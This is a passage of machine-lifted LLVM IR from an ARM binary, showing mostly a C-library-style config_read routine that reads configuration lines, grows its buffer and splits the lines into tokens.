  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_1902c

dec_label_pc_18ff4:                               ; preds = %dec_label_pc_18fd8
  %v1_18ff4 = load i32, i32* @r5, align 4
  %v2_18ff4 = add i32 %v1_18ff4, 8
  %v3_18ff4 = inttoptr i32 %v2_18ff4 to i32*
  store i32 %v5_18fe4, i32* %v3_18ff4, align 4
  %v0_18ff8 = load i32, i32* @r7, align 4
  %v1_18ff8 = load i32, i32* @r5, align 4
  %v2_18ff8 = add i32 %v1_18ff8, 4
  %v3_18ff8 = inttoptr i32 %v2_18ff8 to i32*
  store i32 %v0_18ff8, i32* %v3_18ff8, align 4
  %v0_18ffc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18ffc

dec_label_pc_18ffc:                               ; preds = %dec_label_pc_18fcc, %dec_label_pc_18ff4
  %v1_19020 = phi i32 [ %v0_18fcc, %dec_label_pc_18fcc ], [ %v0_18ffc.pre, %dec_label_pc_18ff4 ]
  %v1_18ffc = add i32 %v1_19020, 4
  %v2_18ffc = inttoptr i32 %v1_18ffc to i32*
  %v3_18ffc = load i32, i32* %v2_18ffc, align 4
  %v1_19000 = add i32 %v1_19020, 12
  %v2_19000 = inttoptr i32 %v1_19000 to i32*
  %v3_19000 = load i32, i32* %v2_19000, align 4
  %v2_19004 = add i32 %v3_19000, %v3_18ffc
  store i32 %v2_19004, i32* @r4, align 4
  %v3_19008 = inttoptr i32 %v2_19004 to i32*
  %v4_19008 = load i32, i32* %v3_19008, align 4
  %v1_1900c = add i32 %v2_19004, 4
  %v2_1900c = inttoptr i32 %v1_1900c to i32*
  %v3_1900c = load i32, i32* %v2_1900c, align 4
  %v1_19010 = add i32 %v2_19004, 16
  %v2_19010 = inttoptr i32 %v1_19010 to i16*
  %v3_19010 = load i16, i16* %v2_19010, align 2
  %v4_19010 = zext i16 %v3_19010 to i32
  %v1_19014 = add i32 %v2_19004, 8
  %v2_19014 = inttoptr i32 %v1_19014 to i32*
  %v3_19014 = load i32, i32* %v2_19014, align 4
  store i32 %v3_19014, i32* %ip.global-to-local, align 4
  %v2_19018 = add i32 %v4_19010, %v3_18ffc
  %v2_1901c = or i32 %v3_1900c, %v4_19008
  %v4_1901c = icmp eq i32 %v2_1901c, 0
  store i32 %v2_19018, i32* %v2_18ffc, align 4
  %v0_19024 = load i32, i32* %ip.global-to-local, align 4
  %v1_19024 = load i32, i32* @r5, align 4
  %v2_19024 = add i32 %v1_19024, 16
  %v3_19024 = inttoptr i32 %v2_19024 to i32*
  store i32 %v0_19024, i32* %v3_19024, align 4
  br i1 %v4_1901c, label %dec_label_pc_18fcc, label %dec_label_pc_1902c

dec_label_pc_1902c:                               ; preds = %dec_label_pc_18ffc, %.thread
  %v0_19038 = load i32, i32* @r6, align 4
  %v2_19038 = add i32 %v0_19038, 24
  %v3_19038 = inttoptr i32 %v2_19038 to i32*
  %v4_19038 = load i32, i32* %v3_19038, align 4
  store i32 %v4_19038, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_19038)
  %v0_19044 = load i32, i32* @r4, align 4
  ret i32 %v0_19044

; uselistorder directives
  uselistorder i32 %v2_19004, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_19020, { 1, 0 }
  uselistorder i32 %v6_18fcc, { 1, 0 }
  uselistorder i32 %v0_18fcc, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_18ffc, { 1, 0 }
}

define i32 @function_19058(i32 %arg1) local_unnamed_addr {
dec_label_pc_19058:
  %v0_19058 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_19058, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_19058
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_19058, %bb
  %v10_19064 = phi i32 [ %arg1, %dec_label_pc_19058 ], [ 0, %bb ]
  ret i32 %v10_19064

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 26452)
}

define i32 @__GI_config_read(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_19084 = load i32, i32* @r4, align 4
  %v6_19084 = load i32, i32* @r5, align 4
  %v9_19084 = load i32, i32* @r6, align 4
  %v12_19084 = load i32, i32* @r7, align 4
  %v15_19084 = load i32, i32* @r8, align 4
  %v18_19084 = load i32, i32* @sb, align 4
  %v21_19084 = load i32, i32* @sl, align 4
  %v24_19084 = load i32, i32* @fp, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_19088 = icmp eq i32* %arg1, null
  store i1 %v2_19088, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v2_19088, label %dec_label_pc_19398, label %dec_label_pc_190a0

dec_label_pc_190a0:                               ; preds = %entry
  %v1_190a0 = urem i32 %arg3, 256
  store i32 %v1_190a0, i32* @sb, align 4
  %v1_190a4 = udiv i32 %arg3, 256
  %v3_190a8 = urem i32 %v1_190a4, 256
  %v3_190ac = mul nuw nsw i32 %v1_190a0, 4
  %v1_190b4 = or i32 %v3_190ac, 1
  %v1_190c0 = and i32 %arg3, 131072
  %v1_190c4 = add nsw i32 %v1_190a0, -1
  %v1_190d0 = and i32 %arg3, 262144
  store i32 %v1_190d0, i32* %r2.global-to-local, align 4
  %v1_190d4 = and i32 %arg3, 65536
  store i32 %v1_190d4, i32* %r3.global-to-local, align 4
  store i32 %v1_190d4, i32* %stack_var_-72, align 4
  store i32 0, i32* @fp, align 4
  %v1_190e4 = add i32 %arg4, 1
  store i32 %v1_190e4, i32* @sl, align 4
  %v2_19264 = inttoptr i32 %arg2 to i32*
  %v2_19274 = icmp eq i32 %v1_190c0, 0
  %v2_192cc = icmp eq i32 %v1_190d0, 0
  br label %dec_label_pc_190e8

dec_label_pc_190e8:                               ; preds = %dec_label_pc_190e8.backedge, %dec_label_pc_190a0
  %v2_19104 = phi i32 [ %v0_190e8.pre, %dec_label_pc_190e8.backedge ], [ %tmp, %dec_label_pc_190a0 ]
  %v1_190e8 = add i32 %v2_19104, 4
  %v2_190e8 = inttoptr i32 %v1_190e8 to i32*
  %v3_190e8 = load i32, i32* %v2_190e8, align 4
  store i32 %v3_190e8, i32* %r3.global-to-local, align 4
  %v2_190ec = icmp eq i32 %v3_190e8, 0
  store i1 %v2_190ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_190ec, label %dec_label_pc_190f4, label %dec_label_pc_1913c

dec_label_pc_190f4:                               ; preds = %dec_label_pc_190e8
  %v1_190f4 = add i32 %v2_19104, 16
  %v2_190f4 = inttoptr i32 %v1_190f4 to i32*
  %v3_190f4 = load i32, i32* %v2_190f4, align 4
  store i32 %v3_190f4, i32* %r3.global-to-local, align 4
  %v2_190f8 = icmp eq i32 %v3_190f4, 0
  store i1 %v2_190f8, i1* %cpsr_z.global-to-local, align 1
  %v1_190fc = add i32 %v2_19104, 8
  %v2_190fc = inttoptr i32 %v1_190fc to i32*
  %v3_190fc = load i32, i32* %v2_190fc, align 4
  store i32 %v3_190fc, i32* %r3.global-to-local, align 4
  br i1 %v2_190f8, label %bb, label %bb66

bb:                                               ; preds = %dec_label_pc_190f4
  store i32 81, i32* %r2.global-to-local, align 4
  store i32 81, i32* %v2_190f4, align 4
  %v0_19108.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_190f4, %bb
  %v0_19108 = phi i32 [ %v0_19108.pre, %bb ], [ %v3_190fc, %dec_label_pc_190f4 ]
  %v2_19108 = icmp eq i32 %v0_19108, 0
  store i1 %v2_19108, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19108, label %bb67, label %.thread

bb67:                                             ; preds = %bb66
  store i32 %v1_190b4, i32* %r3.global-to-local, align 4
  %v2_19110 = load i32, i32* @r5, align 4
  %v3_19110 = add i32 %v2_19110, 8
  %v4_19110 = inttoptr i32 %v3_19110 to i32*
  store i32 %v1_190b4, i32* %v4_19110, align 4
  br label %.thread

.thread:                                          ; preds = %bb66, %bb67
  %v0_19114 = load i32, i32* @r5, align 4
  %v1_19114 = add i32 %v0_19114, 16
  %v2_19114 = inttoptr i32 %v1_19114 to i32*
  %v3_19114 = load i32, i32* %v2_19114, align 4
  store i32 %v3_19114, i32* %r0.global-to-local, align 4
  %v1_19118 = add i32 %v0_19114, 8
  %v2_19118 = inttoptr i32 %v1_19118 to i32*
  %v3_19118 = load i32, i32* %v2_19118, align 4
  store i32 %v3_19118, i32* %r3.global-to-local, align 4
  %v2_1911c = add i32 %v3_19118, %v3_19114
  store i32 %v2_1911c, i32* %r0.global-to-local, align 4
  %v1_19120 = call i32 @malloc(i32 %v2_1911c)
  store i32 %v1_19120, i32* %r0.global-to-local, align 4
  %v2_19124 = icmp eq i32 %v1_19120, 0
  store i1 %v2_19124, i1* %cpsr_z.global-to-local, align 1
  %v1_19128 = load i32, i32* @r5, align 4
  %v2_19128 = add i32 %v1_19128, 4
  %v3_19128 = inttoptr i32 %v2_19128 to i32*
  store i32 %v1_19120, i32* %v3_19128, align 4
  br i1 %v2_19124, label %dec_label_pc_19398, label %dec_label_pc_19130

dec_label_pc_19130:                               ; preds = %.thread
  %v0_19130 = load i32, i32* @r5, align 4
  %v1_19130 = add i32 %v0_19130, 20
  %v2_19130 = inttoptr i32 %v1_19130 to i32*
  %v3_19130 = load i32, i32* %v2_19130, align 4
  %v1_19134 = or i32 %v3_19130, 1
  store i32 %v1_19134, i32* %r3.global-to-local, align 4
  store i32 %v1_19134, i32* %v2_19130, align 4
  %v0_1913c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1913c

dec_label_pc_1913c:                               ; preds = %dec_label_pc_190e8, %dec_label_pc_19130
  %v1_19144 = phi i32 [ %v2_19104, %dec_label_pc_190e8 ], [ %v0_1913c.pre, %dec_label_pc_19130 ]
  %v1_1913c = add i32 %v1_19144, 4
  %v2_1913c = inttoptr i32 %v1_1913c to i32*
  %v3_1913c = load i32, i32* %v2_1913c, align 4
  store i32 %v3_1913c, i32* %r2.global-to-local, align 4
  %v4_1913c = add i32 %v1_19144, 8
  %v5_1913c = inttoptr i32 %v4_1913c to i32*
  %v6_1913c = load i32, i32* %v5_1913c, align 4
  %v2_19140 = add i32 %v6_1913c, %v3_1913c
  store i32 %v2_19140, i32* %r3.global-to-local, align 4
  %v2_19144 = add i32 %v1_19144, 12
  %v3_19144 = inttoptr i32 %v2_19144 to i32*
  store i32 %v2_19140, i32* %v3_19144, align 4
  %v0_19148 = load i32, i32* @fp, align 4
  store i32 %v0_19148, i32* @r6, align 4
  br label %dec_label_pc_1914c

dec_label_pc_1914c:                               ; preds = %dec_label_pc_191d8, %dec_label_pc_191c4, %dec_label_pc_1913c
  %v0_19154 = phi i32 [ %v0_19148, %dec_label_pc_1913c ], [ %v1_191c4, %dec_label_pc_191c4 ], [ %v0_19154.pre.pre, %dec_label_pc_191d8 ]
  %v0_1914c = load i32, i32* @r5, align 4
  %v1_1914c = add i32 %v0_1914c, 12
  store i32 %v1_1914c, i32* %r0.global-to-local, align 4
  %v1_19150 = inttoptr i32 %v1_1914c to i32*
  %v2_19150 = load i32, i32* %v1_19150, align 4
  store i32 %v2_19150, i32* %r0.global-to-local, align 4
  %v3_19150 = add i32 %v0_1914c, 16
  %v4_19150 = inttoptr i32 %v3_19150 to i32*
  %v5_19150 = load i32, i32* %v4_19150, align 4
  %v2_19154 = add i32 %v2_19150, %v0_19154
  store i32 %v2_19154, i32* %r0.global-to-local, align 4
  %v2_19158 = sub i32 %v5_19150, %v0_19154
  %v1_1915c = inttoptr i32 %v0_1914c to i32*
  %v2_1915c = load i32, i32* %v1_1915c, align 4
  store i32 %v2_1915c, i32* %r2.global-to-local, align 4
  %v3_19160 = call i32 @fgets(i32 %v2_19154, i32 %v2_19158, i32 %v2_1915c)
  store i32 %v3_19160, i32* %r0.global-to-local, align 4
  store i32 %v3_19160, i32* %r4.global-to-local, align 4
  %v2_19164 = icmp eq i32 %v3_19160, 0
  store i1 %v2_19164, i1* %cpsr_z.global-to-local, align 1
  %v0_1916c = load i32, i32* @r5, align 4
  %v1_1916c = add i32 %v0_1916c, 12
  br i1 %v2_19164, label %dec_label_pc_1916c, label %dec_label_pc_19184

dec_label_pc_1916c:                               ; preds = %dec_label_pc_1914c
  store i32 %v1_1916c, i32* %r0.global-to-local, align 4
  %v1_19170 = inttoptr i32 %v1_1916c to i32*
  %v2_19170 = load i32, i32* %v1_19170, align 4
  store i32 %v2_19170, i32* %r0.global-to-local, align 4
  %v3_19170 = add i32 %v0_1916c, 16
  %v4_19170 = inttoptr i32 %v3_19170 to i32*
  %v5_19170 = load i32, i32* %v4_19170, align 4
  store i32 %v5_19170, i32* @r2, align 4
  %v2_19178 = inttoptr i32 %v2_19170 to i8*
  %v3_19178 = call i32 @__GI_memset(i8* %v2_19178, i32 0)
  store i32 %v3_19178, i32* %r0.global-to-local, align 4
  %v0_1917c = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1939c

dec_label_pc_19184:                               ; preds = %dec_label_pc_1914c
  %v2_19184 = inttoptr i32 %v1_1916c to i32*
  %v3_19184 = load i32, i32* %v2_19184, align 4
  store i32 %v3_19184, i32* @r4, align 4
  %v1_19188 = load i32, i32* @r6, align 4
  %v2_19188 = add i32 %v1_19188, %v3_19184
  %v3_19188 = inttoptr i32 %v2_19188 to i8*
  store i32 %v2_19188, i32* %r0.global-to-local, align 4
  %v3_1918c = call i32 @strlen(i8* %v3_19188)
  %v0_19194 = load i32, i32* @r6, align 4
  %v2_19194 = add i32 %v0_19194, %v3_1918c
  store i32 %v2_19194, i32* @r6, align 4
  %v0_19198 = load i32, i32* @r4, align 4
  store i32 %v0_19198, i32* @r0, align 4
  %v2_1919c = call i32 @__GI_strchr(i32 %v0_19198, i32 10)
  store i32 %v2_1919c, i32* %r0.global-to-local, align 4
  %v2_191a0 = icmp eq i32 %v2_1919c, 0
  store i1 %v2_191a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_191a0, label %dec_label_pc_191cc, label %dec_label_pc_191a8

dec_label_pc_191a8:                               ; preds = %dec_label_pc_19184
  %v1_191a8 = inttoptr i32 %v2_1919c to i8*
  %v2_191a8 = load i8, i8* %v1_191a8, align 1
  %v3_191a8 = zext i8 %v2_191a8 to i32
  %v1_191ac = add nuw nsw i32 %v3_191a8, 255
  %v1_191b0 = urem i32 %v1_191ac, 256
  store i32 %v1_191b0, i32* %r3.global-to-local, align 4
  %v7_191b4 = icmp eq i32 %v1_191b0, 92
  store i1 %v7_191b4, i1* %cpsr_z.global-to-local, align 1
  %v1_191b8 = trunc i32 %v1_191ac to i8
  store i8 %v1_191b8, i8* %v1_191a8, align 1
  %v0_191bc = load i32, i32* @r6, align 4
  %v1_191bc = add i32 %v0_191bc, -1
  store i32 %v1_191bc, i32* @r6, align 4
  %v0_191c0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_191c0, label %dec_label_pc_191c4, label %dec_label_pc_19250

dec_label_pc_191c4:                               ; preds = %dec_label_pc_191a8
  %v1_191c4 = add i32 %v0_191bc, -2
  store i32 %v1_191c4, i32* @r6, align 4
  br label %dec_label_pc_1914c

dec_label_pc_191cc:                               ; preds = %dec_label_pc_19184
  %v0_191cc = load i32, i32* @r5, align 4
  %v1_191cc = add i32 %v0_191cc, 20
  %v2_191cc = inttoptr i32 %v1_191cc to i32*
  %v3_191cc = load i32, i32* %v2_191cc, align 4
  store i32 %v3_191cc, i32* %r3.global-to-local, align 4
  %v2_191d0 = icmp eq i32 %v3_191cc, 0
  store i1 %v2_191d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_191d0, label %dec_label_pc_19208, label %dec_label_pc_191d8

dec_label_pc_191d8:                               ; preds = %dec_label_pc_191cc
  %v1_191d8 = add i32 %v0_191cc, 16
  %v2_191d8 = inttoptr i32 %v1_191d8 to i32*
  %v3_191d8 = load i32, i32* %v2_191d8, align 4
  store i32 %v3_191d8, i32* %r3.global-to-local, align 4
  %v1_191dc = add i32 %v0_191cc, 8
  %v2_191dc = inttoptr i32 %v1_191dc to i32*
  %v3_191dc = load i32, i32* %v2_191dc, align 4
  %v1_191e0 = add i32 %v3_191d8, 4096
  store i32 %v1_191e0, i32* %r3.global-to-local, align 4
  %v2_191e4 = add i32 %v3_191dc, %v1_191e0
  store i32 %v1_191e0, i32* %v2_191d8, align 4
  %v0_191ec = load i32, i32* @r5, align 4
  %v1_191ec = add i32 %v0_191ec, 4
  %v2_191ec = inttoptr i32 %v1_191ec to i32*
  %v3_191ec = load i32, i32* %v2_191ec, align 4
  store i32 %v3_191ec, i32* %r0.global-to-local, align 4
  %v2_191f0 = inttoptr i32 %v3_191ec to i32*
  %v3_191f0 = call i32 @realloc(i32* %v2_191f0, i32 %v2_191e4)
  store i32 %v3_191f0, i32* %r0.global-to-local, align 4
  %v0_191f4 = load i32, i32* @r5, align 4
  %v1_191f4 = add i32 %v0_191f4, 8
  %v2_191f4 = inttoptr i32 %v1_191f4 to i32*
  %v3_191f4 = load i32, i32* %v2_191f4, align 4
  %v2_191f8 = add i32 %v3_191f4, %v3_191f0
  store i32 %v2_191f8, i32* %r3.global-to-local, align 4
  %v2_191fc = add i32 %v0_191f4, 12
  %v3_191fc = inttoptr i32 %v2_191fc to i32*
  store i32 %v2_191f8, i32* %v3_191fc, align 4
  %v1_19200 = load i32, i32* @r5, align 4
  %v2_19200 = add i32 %v1_19200, 4
  %v3_19200 = inttoptr i32 %v2_19200 to i32*
  store i32 %v3_191f0, i32* %v3_19200, align 4
  %v0_19154.pre.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1914c

dec_label_pc_19208:                               ; preds = %dec_label_pc_191cc, %.dec_label_pc_19208_crit_edge
  %v0_19208 = phi i32 [ %v0_19208.pre, %.dec_label_pc_19208_crit_edge ], [ %v0_191cc, %dec_label_pc_191cc ]
  %v1_19208 = inttoptr i32 %v0_19208 to i32*
  %v2_19208 = load i32, i32* %v1_19208, align 4
  %v1_1920c = add i32 %v2_19208, 52
  %v2_1920c = inttoptr i32 %v1_1920c to i32*
  %v3_1920c = load i32, i32* %v2_1920c, align 4
  store i32 %v3_1920c, i32* %r3.global-to-local, align 4
  %v2_19210 = icmp eq i32 %v3_1920c, 0
  store i1 %v2_19210, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19210, label %dec_label_pc_1923c, label %dec_label_pc_19218

dec_label_pc_19218:                               ; preds = %dec_label_pc_19208
  %v1_19218 = add i32 %v2_19208, 16
  %v2_19218 = inttoptr i32 %v1_19218 to i32*
  %v3_19218 = load i32, i32* %v2_19218, align 4
  store i32 %v3_19218, i32* %r2.global-to-local, align 4
  %v1_1921c = add i32 %v2_19208, 24
  %v2_1921c = inttoptr i32 %v1_1921c to i32*
  %v3_1921c = load i32, i32* %v2_1921c, align 4
  store i32 %v3_1921c, i32* %r3.global-to-local, align 4
  %v3_19220 = icmp ult i32 %v3_19218, %v3_1921c
  %v9_19220 = icmp eq i32 %v3_19218, %v3_1921c
  store i1 %v9_19220, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_19220, label %dec_label_pc_19244thread-pre-split, label %dec_label_pc_19230

dec_label_pc_19230:                               ; preds = %dec_label_pc_19218
  store i32 %v2_19208, i32* %r0.global-to-local, align 4
  %v1_19234 = inttoptr i32 %v2_19208 to i16*
  %v2_19234 = call i32 @getc_unlocked(i16* %v1_19234)
  store i32 %v2_19234, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19244

dec_label_pc_1923c:                               ; preds = %dec_label_pc_19208
  store i32 %v2_19208, i32* %r0.global-to-local, align 4
  %v1_19240 = call i32 @__GI_fgetc(i32 %v2_19208)
  store i32 %v1_19240, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19244

dec_label_pc_19244thread-pre-split:               ; preds = %dec_label_pc_19218
  %v2_19224 = inttoptr i32 %v3_19218 to i8*
  %v3_19224 = load i8, i8* %v2_19224, align 1
  %v4_19224 = zext i8 %v3_19224 to i32
  store i32 %v4_19224, i32* %r0.global-to-local, align 4
  %v6_19224 = add i32 %v3_19218, 1
  store i32 %v6_19224, i32* %r2.global-to-local, align 4
  store i32 %v6_19224, i32* %v2_19218, align 4
  %v0_19244.pr = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19244

dec_label_pc_19244:                               ; preds = %dec_label_pc_19244thread-pre-split, %dec_label_pc_19230, %dec_label_pc_1923c
  %v1_19248 = phi i32 [ %v0_19244.pr, %dec_label_pc_19244thread-pre-split ], [ %v2_19234, %dec_label_pc_19230 ], [ %v1_19240, %dec_label_pc_1923c ]
  %v7_19244 = icmp eq i32 %v1_19248, 10
  store i1 %v7_19244, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19244, label %dec_label_pc_19250.loopexit, label %bb68

bb68:                                             ; preds = %dec_label_pc_19244
  %v8_19248 = icmp eq i32 %v1_19248, -1
  store i1 %v8_19248, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_19248, label %dec_label_pc_19250.loopexit, label %.dec_label_pc_19208_crit_edge

.dec_label_pc_19208_crit_edge:                    ; preds = %bb68
  %v0_19208.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_19208

dec_label_pc_19250.loopexit:                      ; preds = %bb68, %dec_label_pc_19244
  %v0_19250.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_19250

dec_label_pc_19250:                               ; preds = %dec_label_pc_191a8, %dec_label_pc_19250.loopexit
  %v0_19250 = phi i32 [ %v0_19250.pre, %dec_label_pc_19250.loopexit ], [ %v1_191bc, %dec_label_pc_191a8 ]
  %v7_19250 = icmp eq i32 %v0_19250, -1
  store i1 %v7_19250, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19250, label %dec_label_pc_19398, label %dec_label_pc_19258

dec_label_pc_19258:                               ; preds = %dec_label_pc_19250
  %v0_19258 = load i32, i32* @r5, align 4
  %v1_19258 = add i32 %v0_19258, 4
  %v2_19258 = inttoptr i32 %v1_19258 to i32*
  %v3_19258 = load i32, i32* %v2_19258, align 4
  store i32 %v3_19258, i32* %r0.global-to-local, align 4
  store i32 %v3_190ac, i32* @r2, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  store i32 %v3_19258, i32* %v2_19264, align 4
  %v0_19268 = load i32, i32* @fp, align 4
  %v2_1926c = inttoptr i32 %v3_19258 to i8*
  %v3_1926c = call i32 @__GI_memset(i8* %v2_1926c, i32 %v0_19268)
  store i32 %v3_1926c, i32* %r0.global-to-local, align 4
  store i32 %v1_190c0, i32* %r2.global-to-local, align 4
  store i1 %v2_19274, i1* %cpsr_z.global-to-local, align 1
  %v0_19278 = load i32, i32* @r5, align 4
  %v1_19278 = add i32 %v0_19278, 12
  %v2_19278 = inttoptr i32 %v1_19278 to i32*
  %v3_19278 = load i32, i32* %v2_19278, align 4
  store i32 %v3_19278, i32* @r4, align 4
  br i1 %v2_19274, label %dec_label_pc_19290, label %dec_label_pc_19280

dec_label_pc_19280:                               ; preds = %dec_label_pc_19258
  store i32 %v3_19278, i32* @r0, align 4
  %v1_19288 = inttoptr i32 %v3_19278 to i8*
  %v2_19288 = call i32 @__GI_strspn(i8* %v1_19288)
  store i32 %v2_19288, i32* %r0.global-to-local, align 4
  %v0_1928c = load i32, i32* @r4, align 4
  %v2_1928c = add i32 %v0_1928c, %v2_19288
  store i32 %v2_1928c, i32* @r4, align 4
  br label %dec_label_pc_19290

dec_label_pc_19290:                               ; preds = %dec_label_pc_19258, %dec_label_pc_19280
  %v0_1936813 = phi i32 [ %v3_19278, %dec_label_pc_19258 ], [ %v2_1928c, %dec_label_pc_19280 ]
  %v1_19290 = inttoptr i32 %v0_1936813 to i8*
  %v2_19290 = load i8, i8* %v1_19290, align 1
  %v3_19290 = zext i8 %v2_19290 to i32
  store i32 %v3_19290, i32* %r2.global-to-local, align 4
  %v2_19294 = icmp eq i8 %v2_19290, 0
  store i1 %v2_19294, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19294, label %dec_label_pc_190e8.backedge, label %dec_label_pc_1929c

dec_label_pc_190e8.backedge:                      ; preds = %dec_label_pc_19290, %dec_label_pc_19390, %dec_label_pc_1929c
  %v0_190e8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_190e8

dec_label_pc_1929c:                               ; preds = %dec_label_pc_19290
  %v0_1929c = load i32, i32* @r7, align 4
  %v1_1929c = inttoptr i32 %v0_1929c to i8*
  %v2_1929c = load i8, i8* %v1_1929c, align 1
  %v3_1929c = zext i8 %v2_1929c to i32
  store i32 %v3_1929c, i32* %r3.global-to-local, align 4
  %v9_192a0 = icmp eq i8 %v2_1929c, %v2_19290
  store i1 %v9_192a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_192a0, label %dec_label_pc_190e8.backedge, label %dec_label_pc_19368.preheader

dec_label_pc_19368.preheader:                     ; preds = %dec_label_pc_1929c
  %v1_192a4 = load i32, i32* @fp, align 4
  store i32 %v1_192a4, i32* @r6, align 4
  %v2_1936815 = load i8, i8* %v1_19290, align 1
  %v3_1936816 = zext i8 %v2_1936815 to i32
  store i32 %v3_1936816, i32* %r2.global-to-local, align 4
  %v2_1936c17 = icmp eq i8 %v2_1936815, 0
  store i1 %v2_1936c17, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1936c17, label %dec_label_pc_19384, label %dec_label_pc_19374.preheader

dec_label_pc_19374.preheader:                     ; preds = %dec_label_pc_19368.preheader
  %v2_1937482 = load i8, i8* %v1_1929c, align 1
  %v3_1937483 = zext i8 %v2_1937482 to i32
  store i32 %v3_1937483, i32* %r3.global-to-local, align 4
  %v9_1937886 = icmp eq i8 %v2_1937482, %v2_1936815
  store i1 %v9_1937886, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1937886, label %dec_label_pc_19384, label %bb74

dec_label_pc_192b0:                               ; preds = %bb74
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v2_192b4 = load i32, i32* %v2_19264, align 4
  store i32 %v2_192b4, i32* %r3.global-to-local, align 4
  store i32 %v1_190c4, i32* %r2.global-to-local, align 4
  %v9_192bc = icmp eq i32 %v2_192c088, %v1_190c4
  store i1 %v9_192bc, i1* %cpsr_z.global-to-local, align 1
  %v5_192c0 = mul i32 %v2_192c088, 4
  %v6_192c0 = add i32 %v2_192b4, %v5_192c0
  %v7_192c0 = inttoptr i32 %v6_192c0 to i32*
  store i32 %v0_192c087, i32* %v7_192c0, align 4
  br i1 %v9_192bc, label %dec_label_pc_192c8, label %dec_label_pc_192d4

dec_label_pc_192c8:                               ; preds = %dec_label_pc_192b0
  store i32 %v1_190d0, i32* %r3.global-to-local, align 4
  store i1 %v2_192cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_192cc, label %dec_label_pc_192d4, label %dec_label_pc_192f4

dec_label_pc_192d4:                               ; preds = %dec_label_pc_192c8, %dec_label_pc_192b0
  %v0_192d4 = load i32, i32* @r7, align 4
  %v1_192d4 = inttoptr i32 %v0_192d4 to i8*
  %v2_192d4 = load i8, i8* %v1_192d4, align 1
  %v3_192d4 = zext i8 %v2_192d4 to i32
  store i32 %v3_192d4, i32* %r3.global-to-local, align 4
  %v2_192d8 = icmp eq i8 %v2_192d4, 0
  store i1 %v2_192d8, i1* %cpsr_z.global-to-local, align 1
  %v0_192dc = load i32, i32* @r4, align 4
  store i32 %v0_192dc, i32* @r0, align 4
  %v1_192e0 = load i32, i32* @sl, align 4
  %storemerge = select i1 %v2_192d8, i32 %v1_192e0, i32 %v0_192d4
  store i32 %storemerge, i32* @r1, align 4
  %v0_192e8 = call i32 @strcspn()
  store i32 %v0_192e8, i32* %r0.global-to-local, align 4
  %v0_192ec = load i32, i32* @r4, align 4
  %v2_192ec = add i32 %v0_192ec, %v0_192e8
  store i32 %v2_192ec, i32* @r4, align 4
  br label %dec_label_pc_1932c

dec_label_pc_192f4:                               ; preds = %dec_label_pc_192c8
  %v0_192f4 = load i32, i32* @r4, align 4
  store i32 %v0_192f4, i32* @r0, align 4
  %v0_192f8 = load i32, i32* @r7, align 4
  %v1_192f8 = inttoptr i32 %v0_192f8 to i8*
  %v2_192f8 = load i8, i8* %v1_192f8, align 1
  %v3_192f8 = zext i8 %v2_192f8 to i32
  %v5_192fc = call i32 @__GI_strchrnul(i32 %v0_192f4, i32 %v3_192f8, i32 %v1_190c4, i32 %v1_190d0)
  store i32 %v5_192fc, i32* %r0.global-to-local, align 4
  store i32 %v1_190c0, i32* %r2.global-to-local, align 4
  store i1 %v2_19274, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_192fc, i32* @r4, align 4
  br i1 %v2_19274, label %dec_label_pc_1932c, label %dec_label_pc_19318

dec_label_pc_19314:                               ; preds = %dec_label_pc_19318
  %v1_19314 = add i32 %v0_1932c.pre, -1
  store i32 %v1_19314, i32* @r4, align 4
  br label %dec_label_pc_19318

dec_label_pc_19318:                               ; preds = %dec_label_pc_192f4, %dec_label_pc_19314
